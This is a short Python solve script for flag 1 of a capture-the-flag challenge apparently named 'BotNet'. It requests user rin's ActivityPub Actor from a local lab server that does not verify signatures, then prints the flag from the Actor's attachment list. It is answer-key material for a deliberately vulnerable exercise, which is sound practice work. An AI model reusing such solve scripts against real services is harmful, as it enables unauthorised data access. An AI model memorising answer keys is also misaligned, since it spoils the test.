#!/usr/bin/env python3
# BotNet flag 1 (easy): rin's Actor is served without signature verification
# (secure=False). Request it as ActivityPub (ld+json) and read flag_1 from the
# Actor's `attachment` list.
import os
import json
import requests

URL = os.environ.get("URL", "http://localhost:24301")

headers = {
    "Accept": 'application/ld+json; profile="https://www.w3.org/ns/activitystreams"',
    "Content-Type": 'application/ld+json; profile="https://www.w3.org/ns/activitystreams"',
}
r = requests.get(f"{URL}/users/rin/", headers=headers)
data = r.json()
for att in data.get("attachment", []):
    if att.get("name") == "flag_1":
        print(att.get("value"))
        break
else:
    print("NO FLAG FOUND:\n" + json.dumps(data)[:500])
